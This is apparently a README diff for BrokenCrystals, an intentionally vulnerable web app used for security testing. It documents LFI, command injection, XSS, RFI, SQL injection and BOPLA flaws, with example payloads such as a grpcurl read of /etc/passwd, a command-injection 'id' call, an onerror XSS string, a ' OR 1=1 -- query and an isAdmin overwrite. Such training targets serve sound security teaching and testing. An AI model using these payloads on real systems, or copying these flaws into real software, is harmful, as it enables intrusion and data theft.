@@ -348,6 +348,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   </details>
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
+  Additionally, the application exposes a gRPC endpoint `FileService/ReadFile` which is also vulnerable to LFI/RFI.
 
   <details>
     <summary>Example Exploitation</summary>
@@ -397,6 +398,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
            # Entries added by HostAliases.
            127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
            ```
+
+  3.  Accessing the `/etc/passwd` File via gRPC `FileService/ReadFile`
+
+      ```bash
+      grpcurl -plaintext -proto src/grpc/file.proto -d '{"path": "/etc/passwd"}' localhost:5000 file.FileService/ReadFile
+      ```
 
       </details>
 
@@ -484,10 +491,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
     </details>
 
 - **OS Command Injection** - The /api/spawn endpoint spawns a new process using the command in the _command_ query parameter. The endpoint is not referenced from UI.
+  Additionally, the application exposes a gRPC endpoint `OsService/RunCommand` which is also vulnerable to OS Command Injection.
+
     <details>
       <summary>Example Exploitation</summary>
 
-      To demonstrate an SSTI attack, you can use the following `curl` command:
+      To demonstrate an OS Command Injection attack, you can use the following `curl` command:
 
       ```bash
       $ curl 'https://brokencrystals.com/api/spawn?command=uname%20-a'
@@ -497,6 +506,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
       ```
       Linux brokencrystals-5b9b6759cb-66vvt 6.1.115-126.197.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov  5 17:36:57 UTC 2024 x86_64 Linux
+      ```
+
+      To demonstrate the attack via gRPC:
+
+      ```bash
+      grpcurl -plaintext -proto src/grpc/os.proto -d '{"command": "id"}' localhost:5000 os.OsService/RunCommand
       ```
 
     </details>
@@ -787,6 +802,49 @@ Full configuration & usage examples can be found in our [demo project](https://g
             node:x:1000:1000::/home/node:/bin/sh
     </root>
   ```
+
+  </details>
+
+- **Hidden Upload (File Upload + XSS)** - `/hidden-upload` lets users supply a filename that is injected into the DOM without sanitization and upload images (including raw SVG) to `/api/hidden-upload`, which stores them and returns data URLs.
+
+  <details>
+    <summary>Demo of Hidden Upload XSS</summary>
+
+  - Go to `/hidden-upload`, set filename to `<img src=x onerror=alert(1)>`, and upload an SVG; the filename is injected as HTML and the SVG is returned as a data URL.
+
+  </details>
+
+  <details>
+    <summary>Demo of Hidden Upload File Upload</summary>
+
+  - Upload any image (including crafted SVG) to `/hidden-upload`; the backend stores it under `uploads/hidden` and returns a data URL without further validation of content.
+
+  </details>
+
+- **Remote File Inclusion (Safe Files)** - `/api/safe-files` fetches and returns content from user-provided URLs, enabling RFI despite minimal host allowlisting.
+
+  <details>
+    <summary>Demo of Safe Files RFI</summary>
+
+  - POST `{ "name": "test", "url": "https://filedealer.nexploit.app/rfi.md5.txt" }` to `/api/safe-files` to have the server fetch and return remote content.
+
+  </details>
+
+- **SQL Injection (Products Search)** - `/api/products/search?name=` interpolates the `name` parameter directly into a SQL query, allowing injection.
+
+  <details>
+    <summary>Demo of Products SQL Injection</summary>
+
+  - Call `/api/products/search?name=' OR 1=1 --` to dump all products due to unsanitized interpolation.
+
+  </details>
+
+- **Broken Object Property Level Authorization (BOPLA)** - `/api/users/me` GET/PUT expose and update the authenticated user object wholesale, allowing overwriting sensitive fields (including password) without proper field-level authorization.
+
+  <details>
+    <summary>Demo of /api/users/me BOPLA</summary>
+
+  - PUT to `/api/users/me` with `{ "password": "newpass", "isAdmin": true }` to overwrite sensitive fields for the authenticated user.
 
   </details>
 
